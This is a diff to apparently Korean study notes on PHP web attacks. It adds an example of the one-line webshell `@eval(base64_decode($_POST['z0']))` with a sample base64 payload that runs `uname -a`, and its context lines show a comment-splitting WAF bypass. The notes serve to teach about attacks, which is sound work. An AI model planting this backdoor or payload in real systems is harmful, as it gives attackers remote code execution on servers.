@@ -404,4 +404,21 @@ create_function(post(2), post(3))
 * 필터 우회를 위해 일부 문자들을 주석 처리하거나 인코딩
 * 예: WAF가 `create_function`을 막더라도 `cre/*>*/ate_function`처럼 쪼개면 우회 가능
 
+---
+
+## 📎 예제 4. PHP Webshell 업로드를 통한 웹 백도어 및 원격 쉘 공격
+
+.php로 끝나는 경로에서, `eval(base64_decode($_POST[z0]))` 형태로 외부에서 전송한(base64로 인코딩된) 데이터를 디코딩 → `eval()`로 실행하겠다는 코드. 
+
+
+```php
+@eval(base64_decode($_POST['z0']));
+```
+
+* 동작: 공격자는 HTTP POST로 `z0`라는 매개변수에 **base64로 인코딩한 PHP 코드**를 보내고, 서버측은 이를 디코딩해서 `eval()`로 실행합니다.
+  * 예: POST body `z0=PD9waHAgc3lzdGVtKCd1bmFtZSAtYScpOyA/Pg==` (base64 디코딩하면 `<?php system('uname -a'); ?>`) → 서버가 이를 실행하면 `uname -a` 출력이 반환됩니다.
+* `@`는 에러 억제 연산자(경고/에러 감추기) — 탐지 어렵게 하려는 시도.
+
+
+
 
